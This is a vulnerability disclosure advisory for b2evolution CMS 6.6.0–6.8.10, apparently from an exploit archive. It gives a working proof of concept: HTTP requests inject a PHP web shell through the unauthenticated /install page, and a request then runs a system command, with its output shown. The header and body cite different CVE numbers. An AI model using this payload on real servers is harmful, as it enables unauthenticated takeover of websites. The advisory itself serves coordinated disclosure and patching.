@@ -1,0 +1,198 @@
+id: 29361
+date: 01/03/2018
+title: b2evolution CMS 6.8.10 PHP Code Execution Vulnerability
+author: Anti Rais
+cves: CVE-2017-10004
+
+b2evolution CMS 6.6.0 - 6.8.10 PHP code execution
+#################################################
+
+Information
+===========
+
+Name:          b2evolution CMS 6.8.10
+Software:      b2evolution CMS
+Homepage:      http://b2evolution.net/
+Vulnerability: PHP code execution
+Prerequisites: publicly accessible /install functionality
+CVE:           CVE-2017-1000423
+Credit:        Anti RA$?is
+HTML version:  https://bitflipper.eu
+
+Description
+===========
+
+Unauthenticated user with access to `/install` functionality can
+configure the
+application installation parameters and complete the installation. This
+functionality can be used to execute PHP code on the server.
+
+Proof of Concept
+================
+
+Application needs to be installed and configured after coping the source
+code
+to the server. After installation and configuration (`/install`) is
+complete,
+the application will create a `/conf/_basic_config.php` file. It contains
+database connection credentials and other settings. Unauthenticated attacker
+with access to `/intall` functionality can use it to execute PHP code by
+injecting it into different values.
+
+Following scenario demonstrates the issue on Apache web-server.
+
+Following request is made after base configuration is completed:
+================[ src start ]================
+POST /install/index.php HTTP/1.1
+Host: victim.site
+Content-Length: 214
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+
+conf_db_host=localhost&conf_db_name=b2evolution&conf_db_user=root&
+conf_db_password=root&conf_baseurl=http%3A%2F%2Fvictim.site%2F&
+conf_admin_email=admin%40localhost&submit=Update+config+file&
+action=conf&locale=en-US
+================[ src end ]==================
+
+Application creates the `/conf/_basic_config.php` using user supplied
+values:
+
+================[ src start ]================
+...
+/**
+ * MySQL DB settings.
+ * Fill in your database details (check carefully or nothing will work!)
+ */
+$db_config = array(
+  'user'     => 'root',         // your MySQL username
+  'password' => 'root',         // ...and password
+  'name'     => 'b2evolution',  // the name of the database
+  'host'     => 'localhost',    // MySQL Server (typically 'localhost')
+);
+...
+$baseurl = 'http://victim.site/';
+...
+$admin_email = 'admin@localhost';
+...
+================[ src end ]==================
+
+In case the application is installed on public server, the installation
+functionality is publicly accessible to everyone accessing the vulnerable
+site. Assuming that the attacker manages to find a application in this
+state,
+before the initial installation in completed, they can use previously
+described
+request to execute PHP code on the victim's server.
+
+Following parameters are vulnerable and can be used for this attack:
+  * conf_db_tableprefix
+  * conf_admin_email
+  * conf_baseurl
+
+Let's use `conf_baseurl` for example. Attacker specifies the following
+value as
+base URL:
+
+================[ src start ]================
+http://victim.site/\\';$r=$_REQUEST;if(isset($r[0])){$r[0]($r[1]);}/*
+================[ src end ]==================
+
+After finishing the basic setup, following request is made.
+
+================[ src start ]================
+POST /install/index.php HTTP/1.1
+Host: victim.site
+Content-Length: 319
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+
+conf_db_host=localhost&conf_db_name=b2evolution&conf_db_user=root&
+conf_db_password=root&
+conf_baseurl=http%3A%2F%2Fvictim.site%2F%5C%5C%27%3B%24r%3D%24_REQUEST%3Bif
+%28isset%28%24r%5B0%5D%29%29%7B%24r%5B0%5D%28%24r%5B1%5D%29%3B%7D%2F*&
+conf_admin_email=admin%40localhost&submit=Update+config+file&action=conf&
+locale=en-US
+================[ src end ]==================
+
+Application creates the `/conf/_basic_config.php` using attacker given
+values:
+
+================[ src start ]================
+...
+/**
+ * MySQL DB settings.
+ * Fill in your database details (check carefully or nothing will work!)
+ */
+$db_config = array(
+  'user'     => 'root',         // your MySQL username
+  'password' => 'root',         // ...and password
+  'name'     => 'b2evolution',  // the name of the database
+  'host'     => 'localhost',    // MySQL Server (typically 'localhost')
+);
+...
+$baseurl = 'http://victim.site/\\';$r=$_REQUEST;
+  if(isset($r[0])){$r[0]($r[1]);}/*/';
+...
+$admin_email = 'admin@localhost';
+...
+================[ src end ]==================
+
+Attacker can use the PHP shell to execute code and take control of the site:
+view-source:http://victim.site/install/index.php?0=system&1=ls%20-lah;pwd
+
+================[ src start ]================
+
+total 676K
+drwxrwxrwx 1 vagrant vagrant 4.0K Jul 23 00:26 .
+drwxrwxrwx 1 vagrant vagrant 4.0K Jul 23 00:36 ..
+-rw-rw-rw- 1 vagrant vagrant  60K Jul 23 00:26 _functions_create.php
+-rw-rw-rw- 1 vagrant vagrant 2.2K Jul 23 00:26 _functions_delete.php
+-rw-rw-rw- 1 vagrant vagrant 349K Jul 23 00:26 _functions_evoupgrade.php
+-rw-rw-rw- 1 vagrant vagrant  60K Jul 23 00:26 _functions_install.php
+-rw-rw-rw- 1 vagrant vagrant  14K Jul 23 00:26 automated-install.html
+-rw-rw-rw- 1 vagrant vagrant  13K Jul 23 00:26 debug.php
+-rw-rw-rw- 1 vagrant vagrant  831 Jul 23 00:26 index.html
+-rw-rw-rw- 1 vagrant vagrant  52K Jul 23 00:26 index.php
+-rw-rw-rw- 1 vagrant vagrant  16K Jul 23 00:26 license.txt
+-rw-rw-rw- 1 vagrant vagrant  523 Jul 23 00:26 phpinfo.php
+drwxrwxrwx 1 vagrant vagrant 4.0K Jul 23 00:26 test
+/var/www/b2evolution/install
+...
+================[ src end ]==================
+
+Impact
+======
+
+Unauthenticated attacker can execute PHP code on the server. This can be
+used
+to further compromise the site and hide the initial shell on the server.
+
+Conclusion
+==========
+
+Unrestricted access to basic install functionality allows unauthenticated
+attacker to execute PHP code on the server and compromise the site.
+
+New release has been made available to mitigate this issue:
+
+* http://b2evolution.net/downloads/6-9-3
+
+Timeline
+========
+
+* 08.08.2017 | me                 | vulnerability discovered
+* 08.08.2017 | me > developer     | contacted the developer
+* 09.08.2017 | developer          | vulnerability patched
+* 12.08.2017 | me > DWF           | CVE requested
+* 12.08.2017 | me > developer     | asked about patch release estimate
+* 25.08.2017 | developer > public | new release with patch made available
+* 31.08.2017 | me > public        | full disclosure
+* 29.12.2017 | DWF > me           | CVE assigned
+
+---
+Anti RA$?is
+Blog: https://bitflipper.eu
+Pentester at http://www.clarifiedsecurity.com
+
+#  0day.today [2023-03-24]  #
